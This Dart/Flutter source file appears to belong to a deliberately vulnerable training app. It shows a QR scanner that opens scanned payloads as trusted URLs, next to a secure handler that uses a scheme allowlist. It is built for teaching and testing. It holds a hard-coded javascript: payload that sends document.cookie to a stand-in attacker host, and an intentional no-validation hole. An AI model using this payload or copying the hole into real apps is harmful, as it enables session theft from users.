import 'dart:async';

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

import '../../../core/evidence_sink.dart';
import '../../../core/theme/dvma_colors.dart';
import '../../../core/vuln_demo_scaffold.dart';
import '../../../core/widgets/qr_scan_button.dart';
import 'qr_url_handler.dart';

/// QR Scanner -> URL With No Validation.
///
/// A scanned QR code's payload is treated as a trusted URL/deeplink and
/// opened/navigated without validation (Firefox iOS QR-scanner CVE-2025-54145
/// class).
class QrUrlNoValidationScreen extends StatefulWidget {
  const QrUrlNoValidationScreen({super.key});

  static const String vulnId = 'qr_url_no_validation';

  @override
  State<QrUrlNoValidationScreen> createState() =>
      _QrUrlNoValidationScreenState();
}

class _QrUrlNoValidationScreenState extends State<QrUrlNoValidationScreen> {
  /// A crafted QR code carries a javascript: payload. This is the default
  /// tested/CI payload; an optional live scan (mobile only) overrides it.
  static const String _scannedPayload =
      "javascript:document.location='https://evil.example/?c='+document.cookie";

  String _payload = _scannedPayload;
  String? _vulnResult;
  String? _secureResult;

  String _render(QrHandleResult r) {
    final b = StringBuffer();
    b.writeln('scanned payload  : ${r.payload}');
    b.writeln('action           : ${r.action.name}');
    b.writeln('opened           : ${r.opened}');
    if (r.blockReason != null) {
      b.writeln('block reason     : ${r.blockReason}');
    }
    b.writeln('opened dangerous : ${r.openedDangerous}');
    return b.toString().trimRight();
  }

  Future<void> _run() async {
    // VULN: trust the QR payload as a URL and open it directly.
    final vuln = QrUrlHandler.handle(_payload);
    // SECURE: refuse dangerous schemes + privileged deeplinks.
    final secure = QrUrlHandler.handleSafe(_payload);
    setState(() {
      _vulnResult = _render(vuln);
      _secureResult = _render(secure);
    });

    // real artifact: write the unvalidated parsed URL. If it is http(s), prove
    // the SSRF-style follow by performing a genuine http.get on it.
    var artifact = 'unvalidated QR payload opened as trusted url: $_payload';
    final parsed = Uri.tryParse(_payload);
    if (parsed != null &&
        (parsed.scheme == 'http' || parsed.scheme == 'https')) {
      try {
        final resp = await http.get(parsed).timeout(const Duration(seconds: 5));
        artifact +=
            ' :: followed http.get -> status=${resp.statusCode} '
            'bytes=${resp.bodyBytes.length}';
      } catch (e) {
        artifact += ' :: http.get attempted, error=$e';
      }
    }
    await DvmaEvidence.record(
      QrUrlNoValidationScreen.vulnId,
      'qr-url',
      artifact,
    );
  }

  void _onScanned(String decoded) {
    _payload = decoded;
    unawaited(_run());
  }

  @override
  Widget build(BuildContext context) {
    return VulnDemoScaffold(
      vulnId: QrUrlNoValidationScreen.vulnId,
      title: 'QR Scanner -> URL With No Validation',
      difficulty: DvmaDifficulty.easy,
      explanation:
          'A scanned QR code\'s payload is treated as a trusted URL/deeplink '
          'and opened/navigated WITHOUT validation. A QR code is fully '
          'attacker-controlled, so it can carry a "javascript:" URI, a '
          'privileged in-app deeplink, or a phishing link, and the app acts on '
          'it as if the user typed it (Firefox iOS QR-scanner CVE-2025-54145 '
          'class). This is an offline, deterministic simulation: the handler '
          'classifies the payload and reports what it would open/execute. The '
          'secure path refuses "javascript:" and privileged "dvma://" deeplinks '
          'from an untrusted QR, only allowing plain https external links.',
      children: [
        DemoActionButton(label: 'Scan QR code', onPressed: _run),
        QrScanButton(onScanned: _onScanned),
        if (_vulnResult != null)
          EvidencePanel(
            label: 'payload opened as trusted url',
            value: _vulnResult!,
          ),
        if (_secureResult != null)
          EvidencePanel(
            label: 'scheme allowlist enforced',
            value: _secureResult!,
          ),
      ],
    );
  }
}
